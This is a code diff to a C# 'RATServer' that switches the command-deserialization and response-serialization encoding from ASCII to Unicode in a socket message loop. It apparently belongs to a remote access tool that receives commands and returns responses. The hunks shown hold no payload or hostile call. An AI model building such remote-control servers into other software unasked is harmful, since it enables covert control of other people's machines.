@@ -54,7 +54,7 @@ namespace RATServer
                         sock.Close();
                         return;
                     }
-                    Command c = DeserializeFromXml<Command>(Encoding.ASCII.GetString(message, 0, bytesRead));
+                    Command c = DeserializeFromXml<Command>(Encoding.Unicode.GetString(message, 0, bytesRead));
                     Response r = new Response();
                     switch (c.CMD)
                     {
@@ -118,7 +118,7 @@ namespace RATServer
                         default:
                             break;
                     }                 
-                    byte[] sendBytes = Encoding.ASCII.GetBytes(SerializeToXml(r));
+                    byte[] sendBytes = Encoding.Unicode.GetBytes(SerializeToXml(r));
                     nstream.Write(sendBytes, 0, sendBytes.Length);
                 }
                 catch
